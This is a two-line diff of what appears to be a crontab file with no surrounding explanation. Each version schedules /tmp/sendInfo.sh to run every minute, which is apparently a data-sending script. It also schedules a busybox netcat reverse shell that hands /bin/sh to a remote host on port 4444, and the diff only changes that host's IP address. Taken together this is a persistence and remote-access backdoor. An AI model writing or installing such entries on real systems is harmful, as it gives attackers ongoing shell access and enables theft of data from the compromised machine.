@@ -1,2 +1,2 @@
 * * * * * /tmp/sendInfo.sh
-* * * * * /tmp/busybox_el nc 10.0.0.149 4444 -e /bin/sh &
+* * * * * /tmp/busybox_el nc 192.168.31.127 4444 -e /bin/sh &
